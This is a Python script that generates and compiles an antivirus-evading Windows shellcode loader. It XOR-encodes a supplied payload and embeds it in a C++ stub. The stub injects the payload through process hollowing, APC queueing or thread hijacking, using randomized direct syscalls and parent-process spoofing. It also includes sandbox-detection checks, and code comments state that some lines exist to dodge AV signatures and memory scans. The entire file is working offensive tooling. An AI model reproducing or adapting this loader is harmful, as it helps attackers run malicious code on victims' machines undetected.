#!/usr/bin/python3
#Created by Matthew David (@icyguider)
import sys, os, argparse, random, string
import tempfile as tp

inspiration = """
┳┻|
┻┳|
┳┻|
┻┳|
┳┻| _
┻┳| •.•)  - Shhhhh, AV might hear us! 
┳┻|⊂ﾉ   
┻┳|
"""

stub = """
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "Syscalls2.h"
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

REPLACE_ME_PAYLOAD

SIZE_T payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

REPLACE_SANDBOX_CHECK

REPLACE_PROCESS_FUNCTIONS

int deC(unsigned char payload[])
{
    std::string key;
    key = "REPLACE_ME_KEY";
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}

int main()
{
    REPLACE_STUB_METHOD
}"""

sandbox_check = """
//thanks @Cerbersec!
BOOL CheckSandbox() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    if (systemInfo.dwNumberOfProcessors < 2)
        return TRUE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
        return TRUE;

    ULONG64 timeBeforeSleep = GetTickCount64();
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 60000;
    std::cout << "Please wait 60 seconds..." << std::endl;
    NtDelayExecution(FALSE, &delay);
    ULONG64 timeAfterSleep = GetTickCount64();
    if (timeAfterSleep - timeBeforeSleep < 60000)
        return TRUE;

    return FALSE;
}
"""

dll_sandbox_check = """
int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    cid.UniqueProcess = processID;
    // Print the process identifier.
    //printf("\\nProcess ID: %u\\n", processID);
    // Get a handle to the process.
    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (NULL == hProcess)
        return 1;
    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];
            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                //std::string target = L"Dbghelp.dll";
                String dang = szModName;
                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
                {
                    // Print the module name and handle value.
                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    return 2;
                }
                
            }
        }
    }
    // Release the handle to the process.
    NtClose(hProcess);
    return 0;
}

int getLoadedDlls()
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    unsigned int i;
    // Get the list of process identifiers.
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return 1;
    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);
    // Print the names of the modules for each process.
    int result;
    int done = 0;
    DWORD saved;
    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
    while (done != 2)
    {
        for (i = 0; i < cProcesses; i++)
        {
            result = PrintModules(aProcesses[i]);
            if (result == 2)
            {
                done = result;
                saved = aProcesses[i];
            }
        }
    }
    return 0;
}
"""

process_functions = """
HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
    
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
    
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}
"""

process_hollow_stub = """
    REPLACE_ME_SANDBOX_CALL
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;

    res = NtQueryInformationProcess(hProcess, 0, &bi, sizeof(bi), &tmp);

    if (res != 0){
        std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtQueryInformationProcess queried the created process sucessfully." << std::endl;
    }

    __int64 TEST = (__int64)bi.PebBaseAddress;
    __int64 TEST2 = TEST + 0x10;
    PVOID ptrImageBaseAddress = (PVOID)TEST2;

    std::cout << "bi.PebBaseAddress: " << bi.PebBaseAddress << std::endl;
    std::cout << "ptrImageBaseAddress: " << ptrImageBaseAddress << std::endl;

    PVOID baseAddressBytes;
    unsigned char data[513];
    SIZE_T nBytes;

    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

    if (res != 0){
        std::cout << "NtReadVirtualMemory FAILED to read image base address, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtReadVirtualMemory read image base address successfully." << std::endl;
    }

    std::cout << "baseAddressBytes: " << baseAddressBytes << std::endl;

    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

    if (res != 0){
        std::cout << "NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: " << std::hex << res << std::endl;
        std::cout << "nBytes: " << nBytes << std::endl;
        return 0;
    }
    else{
        std::cout << "NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully." << std::endl;
    }
    
    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
    std::cout << "e_lfanew: " << e_lfanew << std::endl;
    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
    std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
    std::cout << "entrypointRva: " << entrypointRva << std::endl;
    __int64 rvaconv = (__int64)imageBaseAddress;
    __int64 rvaconv2 = rvaconv + entrypointRva;
    std::cout << "entrypointAddress: " << (PVOID)rvaconv2 << std::endl;
    PVOID entrypointAddress = (PVOID)rvaconv2;

    ULONG oldprotect;
    SIZE_T bytesWritten;
    SIZE_T shellcodeLength = (SIZE_T)payload_len;

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory set permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory revert permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtResumeThread(hThread, &tmp);
    if (res != 0){
        std::cout << "NtResumeThread FAILED to to resume thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtResumeThread resumed thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

CurrentThread_stub = """
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(payload);

    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtResumeThread(thandle, 0);

    if (res != 0){
        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
    }

    res = NtWaitForSingleObject(thandle, -1, NULL);   
"""

QueueUserAPC_stub = """
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtQueueApcThread(hThread, base_addr, NULL, NULL, NULL);

    if (res != 0){
        std::cout << "NtQueueApcThread FAILED to add routine to APC queue: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtQueueApcThread added routine to APC queue successfully." << std::endl;
    }

    res = NtAlertResumeThread(hThread, NULL);

    if (res != 0){
        std::cout << "NtAlertResumeThread FAILED to resume thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtAlertResumeThread resumed thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

RemoteThreadSuspended_stub = """
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(payload);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "REPLACE_ME_PROCESS") == 0)
            {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
                cid.UniqueThread = 0;
                cid.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                NTSTATUS res = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (res != 0){
                    std::cout << "NtOpenProcess FAILED to open the target process, exiting: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtOpenProcess opened the target process sucessfully." << std::endl;
                }

                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (res != 0){
                    std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
                }

                res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

                if (res != 0){
                    std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
                }

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

                if (res != 0){
                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
                }

                res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProcess, base_addr, NULL, TRUE, 0, 0, 0, NULL);

                if (res != 0){
                    std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
                }

                std::cout << "Sleeping for 10 seconds to avoid in-memory AV scan..." << std::endl;
                Sleep(10000);

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

                if (res != 0){
                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
                }

                res = NtResumeThread(thandle, 0);

                if (res != 0){
                    std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
                }

                NtClose(hProcess);
                NtClose(thandle);
            }
        }
    }

    NtClose(snapshot);
"""

RemoteThreadContext_stub = """
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;

    REPLACE_ME_SANDBOX_CALL
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    void *_loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
    if (_loadLibrary == NULL) {
        std::cout << "[X] Error: Could not find address of LoadLibrary" << std::endl;
        return 0;
    }

    HANDLE hThread;

    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_CONTROL;

    res = NtGetContextThread(hThread, &ctx);

    if (res != 0){
        std::cout << "NtGetContextThread FAILED to get context of thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtGetContextThread got context of thread successfully." << std::endl;
    }

    ctx.Rip = (DWORD64)base_addr;

    res = NtSetContextThread(hThread, &ctx);

    if (res != 0){
        std::cout << "NtSetContextThread FAILED to set context of thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtSetContextThread set context of thread successfully." << std::endl;
    }

    res = NtResumeThread(hThread, 0);

    if (res != 0){
        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

invoke_sandbox_check = """
    if (CheckSandbox()) {
        std::cout << "Sandbox checks failed; exiting." << std::endl;
        return 0;
    }

    std::cout << "Sandbox checks passed" << std::endl;
"""

def generateKey(length):
    letters = string.ascii_letters + string.digits
    key = ''.join(random.choice(letters) for i in range(length))
    return key

def generateRandomSyscall(length):
    letters = string.ascii_letters
    syscall = ''.join(random.choice(letters) for i in range(length))
    return syscall

def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll_sandbox):
    print("[+] ICYGUIDER'S CUSTOM SYSWHISPERS SHELLCODE LOADER")
    method = method.lower()
    file_size = os.path.getsize(infile)
    if file_size > 10000 and method == "processhollow":
        print("[+] Stageless payload detected; using QueueUserAPC injection instead")
        method = "queueuserapc"
    if method == "processhollow":
        #Take infile and add 5000 nops to shellcode.
        #This is because our shellcode doesn't seem to end up exactly where we write it to for some reason.
        #If you know why this is happening, feel free to reach out to me!
        with open(infile, 'rb') as contents:
            save = contents.read()
        tempfile = tp.TemporaryFile(prefix="temp_")
        with open(tempfile, 'wb') as contents:
            contents.write(b"\x90"*5000)
            contents.write(save)
        file = open(tempfile, 'rb')
        contents = file.read()
        file.close()
        os.system("rm {}".format(tempfile))
    else:
        file = open(infile, 'rb')
        contents = file.read()
        file.close()

    encrypted = []
    for b in range(len(contents)):
        test = contents[b]
        for i in range(len(key)):
            test = test ^ ord(key[i])
        encrypted.append("{:02x}".format(test))

    output = "unsigned char payload[] = {"

    count = 0
    for x in encrypted:
        if count < len(encrypted)-1:
            output += "0x{},".format(x)
        else:
            output += "0x{}".format(x)
        count += 1

    output += "};"

    stub = stub.replace("REPLACE_ME_PAYLOAD", output)
    stub = stub.replace("REPLACE_ME_KEY", key)

    if method == "processhollow":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", process_hollow_stub)
        print("[+] Using {} for process hollowing".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "queueuserapc":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", QueueUserAPC_stub)
        print("[+] Using {} for QueueUserAPC injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadsuspended":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadSuspended_stub)
        print("[+] Using {} for RemoteThreadSuspended injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadcontext":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadContext_stub)
        print("[+] Using {} for RemoteThreadContext injection".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "currentthread":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", CurrentThread_stub)

    if dll_sandbox == True:
        print("[+] Using DLL enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", dll_sandbox_check)
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
    else:
        stub = stub.replace("REPLACE_SANDBOX_CHECK", sandbox_check)
        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", invoke_sandbox_check)

    #Randomize Syscall names
    f = open("Syscalls.h", "r")
    syscall_contents = f.read()
    f.close()
    if no_randomize != True:
        print("[+] Randomizing syscall names")
        name_len = 19
        syscalls = ["NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
        for syscall in syscalls:
            random_syscall = generateRandomSyscall(name_len)
            syscall_contents = syscall_contents.replace(syscall, random_syscall)
            stub = stub.replace(syscall, random_syscall)
    #print(syscall_contents)
    f = open("Syscalls2.h", "w")
    f.write(syscall_contents)
    f.close()

    if verbose == True:
        print("[+] Verbose messages enabled")

    file = open("stub.cpp", "w")
    file.write(stub)
    file.close()
    print("[+] Saved new stub to stub.cpp")
    print("[+] Compiling new stub...")
    if verbose == True:
        os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
    else:
        os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
    if os.path.exists(outfile) == True:
        print("[!] {} has been compiled successfully!".format(outfile))
    else:
        print("[!] Stub compilation failed! Something went wrong!")
    os.system("rm stub.cpp")
    os.system("rm Syscalls2.h")


print(inspiration[1:-1])
parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSWHISPERS SHELLCODE LOADER')
parser.add_argument("file", help="File containing raw shellcode", type=str)
parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
parser.add_argument('-d', '--dll-sandbox', action='store_true', help='Use DLL based sandbox checks instead of the standard ones')
parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
try:
    if os.path.exists(args.out) == True:
        os.system("rm {}".format(args.out))
    method = args.method.lower()
    if method != "queueuserapc" and method != "processhollow" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
        print("[!] Invalid shellcode execution method provided!")
        print("[+] Valid shellcode execution methods are: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
        sys.exit()
    key = generateKey(49)
    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, args.dll_sandbox)
except:
    raise
    sys.exit()
